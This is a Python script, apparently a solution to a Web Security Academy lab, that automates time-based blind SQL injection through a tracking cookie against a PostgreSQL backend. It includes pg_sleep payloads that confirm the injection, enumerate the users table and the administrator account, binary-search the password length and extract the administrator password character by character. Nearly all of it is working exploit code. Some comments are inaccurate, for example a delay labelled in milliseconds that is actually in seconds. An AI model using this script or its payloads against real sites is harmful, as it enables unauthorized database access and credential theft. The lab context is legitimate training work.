"""
lab #14 - Blind SQL injection with time delays and information retrieval

Vulnerable parameter - tracking cookie

End goals:

- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator user

Analysis:
1) Confirmar que el parametro es vulnerable a SQLi

' || SELECT pg_sleep(10) --

2) Confirm that the users table exists in the database

' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) else pg_sleep(-1) END) --
' || (SELECT CASE WHEN (1=0) THEN pg_sleep(10) else pg_sleep(-1) END ) --

if the first query makes to sleep 10 seconds over the second query then this confirms that is a postgreSQL database

3) Confirms that administrator user exists in the users table

' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --

4) Enumerate de password length

' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>=0) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --

4) Enumerate the administrator password
' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users) --
"""



import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def sqli_password(url, cookies):
    password_extracted = ""
    for i in range (1,21):
        for j in range(32,126):
            sqli_payload = "' AND (SELECT ASCII(SUBSTRING(password,{0},1)) FROM users WHERE username='administrator' AND LENGTH(password)>1) = '{1}' --".format(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies['TrackingId'] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            
def mensaje_de_salida(mensaje):
    print(mensaje)
    print('Saliendo del sistema')
    sys.exit(-1)

def obtener_cookies(url):
    cookies = requests.get(url).cookies
    cookies_dict = {cookie.name: cookie.value for cookie in cookies}
    print("Cookies obtenidas:")
    for idx, (name, value) in enumerate(cookies_dict.items(),1):
        print(f"{idx}. {name}: {value}")
    return cookies_dict

def seleccionar_cookie():
    print('Que cookie desea explotar?: ', end="")
    indice =  int(input())
    return (indice - 1)

def confirmar_cookie_explotable(url, cookies, cookie_a_explotar, time_delay):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload_con_delay = f"' || (SELECT CASE WHEN (1=1) THEN pg_sleep({time_delay}) else pg_sleep(-1) END) --"
    sqli_payload_encoded_con_delay = urllib.parse.quote(sqli_payload_con_delay)
    cookies_con_delay = cookies
    cookies_con_delay[nombre_cookie] += sqli_payload_encoded_con_delay
    res_con_delay = requests.get(url, cookies = cookies_con_delay)
    cookies[nombre_cookie] = valor_original_cookie
    print(f'Tiempo de respuesta con delay: {res_con_delay.elapsed.total_seconds()}')
    
    sqli_payload_sin_delay = f"' || (SELECT CASE WHEN (1=0) THEN pg_sleep({time_delay}) else pg_sleep(-1) END) --"
    sqli_payload_encoded_sin_delay = urllib.parse.quote(sqli_payload_sin_delay)
    cookies_sin_delay = cookies
    cookies_sin_delay[nombre_cookie] += sqli_payload_encoded_sin_delay
    res_sin_delay = requests.get(url, cookies = cookies_sin_delay)
    cookies[nombre_cookie] = valor_original_cookie
    print(f'Tiempo de respuesta sin delay: {res_sin_delay.elapsed.total_seconds()}')


    if res_con_delay.elapsed.total_seconds() > time_delay and res_sin_delay.elapsed.total_seconds() < time_delay:
        print('(+) La base de datos es PostgreSQL')
        print('(+) La base de datos es vulnerable a blind SQL injection con retraso en el tiempo de respuesta')
        return True
    return False

def confirmar_tabla_users(url, cookies, cookie_a_explotar, time_delay):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    sqli_payload = f"'|| (SELECT CASE WHEN EXISTS (SELECT 1 FROM information_schema.tables WHERE table_name = 'users') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END) --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies = cookies)
    cookies[nombre_cookie] = valor_original_cookie

    if res.elapsed.total_seconds() > time_delay:
        print('(+) Existe una tabla users')
        return True
    return False

def confirmar_usuario_administrator(url, cookies, cookie_a_explotar, time_delay):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    sqli_payload = f"' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies[nombre_cookie] += sqli_payload_encoded
    res = requests.get(url, cookies=cookies)
    cookies[nombre_cookie] = valor_original_cookie
    
    if res.elapsed.total_seconds() > time_delay:
        print('(+) Existe un usuario administrador')
        return True
    return False
def determinar_longitud_password(url, cookies, cookie_a_explotar, time_delay):
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    inicio = 0
    fin = 40

    while inicio <= fin:
        longitud_actual = (inicio + fin) // 2
        sqli_payload = f"' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>={longitud_actual}) THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
        sqli_payload_encoded = urllib.parse.quote(sqli_payload)
        cookies[nombre_cookie] += sqli_payload_encoded
        res = requests.get(url, cookies=cookies)
        cookies[nombre_cookie] = valor_original_cookie
        
        if res.elapsed.total_seconds() > time_delay:
            print(f'probando longitud del password: {longitud_actual}')
            inicio = longitud_actual + 1
        else:
            fin = longitud_actual - 1

    return fin
    
def obtener_password(url, cookies, cookie_a_explotar, longitud_password, time_delay):
    password_extracted = ""
    
    nombre_cookie = list(cookies.keys())[cookie_a_explotar]
    valor_original_cookie = cookies[nombre_cookie]
    
    inicio = 32
    fin =126
    
    for i in range (1,longitud_password+1):
        for j in range(inicio,fin):
            sqli_payload = f"' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,{i},1))='{j}') THEN pg_sleep({time_delay}) ELSE pg_sleep(-1) END FROM users) --"
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies[nombre_cookie] += sqli_payload_encoded
            r = requests.get(url, cookies=cookies)
            cookies[nombre_cookie] = valor_original_cookie
            time = r.elapsed.total_seconds()
            if  time > time_delay:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
                
    return password_extracted

def main():
    url = "https://0a5c00be043add76800ad59900a400ce.web-security-academy.net/"
    time_delay = 4 # milisegundos
    cookies = obtener_cookies(url)
    cookie_a_explotar = seleccionar_cookie()
    
    # 1) Confirmar que el parametro es vulnerable a blind SQL Injection
    cookie_es_explotable = confirmar_cookie_explotable(url, cookies, cookie_a_explotar, time_delay)
    if not cookie_es_explotable:
        mensaje_de_salida('La cookie seleccionada no es explotable')
            
    # 2) Confirmar que existe una tabla users
    existe_tabla_users = confirmar_tabla_users(url, cookies, cookie_a_explotar, time_delay)
    if not existe_tabla_users:
        mensaje_de_salida('No existe una tabla users')
        
    # 3) Confirmar que el usuario administrator existe en la tabla users
    existe_usuario_administrator = confirmar_usuario_administrator(url, cookies, cookie_a_explotar, time_delay)
    if not existe_usuario_administrator:
        mensaje_de_salida('No existe el usuario administrador')

    # 4) Enumerar el password de usuario administrator
    longitud_password = determinar_longitud_password(url, cookies, cookie_a_explotar, time_delay)
    print(f"(+) Longitud del password: {longitud_password} caracteres")
    
    # 5) Ataque de fuerza bruta probando caracter por caracter (se puede implementar un algoritmo de busqueda)
    password = obtener_password(url, cookies, cookie_a_explotar, longitud_password, time_delay)
    print(f"\nEl password obtenido es: {password}")
    
if __name__ == "__main__":
    main()